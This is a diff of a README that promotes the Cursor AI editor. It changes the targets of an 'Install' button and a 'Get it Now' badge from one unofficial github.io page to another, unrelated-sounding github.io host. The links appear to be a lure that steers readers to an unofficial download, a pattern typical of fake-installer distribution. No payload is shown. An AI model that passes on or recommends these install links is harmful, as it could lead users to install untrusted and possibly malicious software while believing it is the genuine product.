@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/cursorAI)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/cursorAI)
 
 </div>
 
@@ -81,7 +81,7 @@ Cursor's full codebase context is the architectural decision that separates it f
 
 <p align="center">
 
-[![Get it Now Cursor AI](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/cursorAI)
+[![Get it Now Cursor AI](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/cursorAI)
 
 </p>
 
